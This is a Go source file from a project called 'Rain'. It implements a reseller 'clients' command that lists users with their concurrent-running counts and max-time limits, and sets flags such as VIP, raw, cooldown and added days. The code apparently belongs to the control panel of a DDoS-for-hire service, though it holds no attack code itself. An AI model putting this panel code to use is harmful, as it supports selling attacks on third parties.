package Commands

import (
	"fmt"
	"strconv"
	"strings"

	Execute "Rain/core/config/views/user"
	Database "Rain/core/database"
	ParseJson "Rain/core/functions/json"
	ParseINI "Rain/core/functions/ini"
	Util "Rain/core/functions/util"
	Sessions "Rain/core/masters/sessions"
	"Rain/core/masters/commands/subCommands/clients"

	"github.com/alexeyco/simpletable"
)

func init() {
	Load_Commands(&Command_interface{
		Name:        "clients",
		Roles:       []string{"reseller"},
		Admin:       false,
		Reseller:    true,
		Description: "Simple users configuration command",
		CommandExecution: func(session *Sessions.Session, cmd []string) error {

			if len(cmd) < 2 {
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "Username"},
						{Align: simpletable.AlignCenter, Text: "Admin"},
						{Align: simpletable.AlignCenter, Text: "Reseller"},
						{Align: simpletable.AlignCenter, Text: "VIP"},
						{Align: simpletable.AlignCenter, Text: "Banned"},
						{Align: simpletable.AlignCenter, Text: "Running"},
						{Align: simpletable.AlignCenter, Text: "Maxtime"},
					},
				}

				User, error := Database.GetUsers()
				if error != nil || User == nil {
					session.Channel.Write([]byte(ParseJson.ConfigParse.App.AppName + " -> Failed to create user list\r\n"))
					return nil
				}

				for _, I := range User {
					Running, error := Database.GetRunningUser(I.Username)
					if error != nil {
						Running = 0
					}

					r := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: I.Username},
						{Align: simpletable.AlignCenter, Text: Util.ColourizeBoolen(I.Admin, true)},
						{Align: simpletable.AlignCenter, Text: Util.ColourizeBoolen(I.Reseller, true)},
						{Align: simpletable.AlignCenter, Text: Util.ColourizeBoolen(I.VIP, true)},
						{Align: simpletable.AlignCenter, Text: Util.ColourizeBoolen(I.Banned, true)},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(Running) + "/" + strconv.Itoa(int(I.Concurrents))},
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(int(I.MaxTime))},
					}

					table.Body.Cells = append(table.Body.Cells, r)
				}

				ParseINI.ParseTableClients(table)

				fmt.Fprint(session.Channel, "")
				fmt.Fprintln(session.Channel, strings.ReplaceAll(table.String(), "\n", "\r\n"))
				fmt.Fprint(session.Channel, "\r")
				return nil

			}

			switch cmd[1] {

				case "create":
					subcommands.CreateUser(session, cmd)
					return nil
				case "add":
					subcommands.CreateUser(session, cmd)
					return nil
				case "remove":
					subcommands.ViewUser(session, cmd)
					return nil
				case "vip=true":
					subcommands.VIPTrue(session, cmd)
					return nil
				case "vip=false":
					subcommands.VIPFalse(session, cmd)
					return nil
				case "raw=true":
					subcommands.RawTrue(session, cmd)
					return nil
				case "raw=false":
					subcommands.RawFalse(session, cmd)
					return nil
				case "holder=true":
					subcommands.HolderTrue(session, cmd)
					return nil
				case "holder=false":
					subcommands.HolderFalse(session, cmd)
					return nil
				case "view":
					subcommands.ViewUser(session, cmd)
					return nil
			}

			sep := strings.Split(cmd[1], "=")
			if len(sep) <= 1 {
				custommap := map[string]string{
					"subcommand": cmd[1],
					"command":    cmd[0],
				}
				Execute.Execute_CustomTerm("subcommand-403", session.User, session.Channel, true, custommap)
				return nil
			}

			switch sep[0] {

				case "cooldown":
					subcommands.UserCooldown(session, sep, cmd)
					return nil
				case "concurrents":
					subcommands.UserConcurrents(session, sep, cmd)
					return nil
				case "maxtime":
					subcommands.UserMaxTime(session, sep, cmd)
					return nil
				case "duration":
					subcommands.UserMaxTime(session, sep, cmd)
					return nil
				case "time":
					subcommands.UserMaxTime(session, sep, cmd)
					return nil
				case "add-days":
					subcommands.UserAddDays(session, sep, cmd)
					return nil
			}

			custommap := map[string]string{
				"subcommand": cmd[1],
				"command":    cmd[0],
			}
			Execute.Execute_CustomTerm("subcommand-403", session.User, session.Channel, true, custommap)

			return nil
		},
	})
}

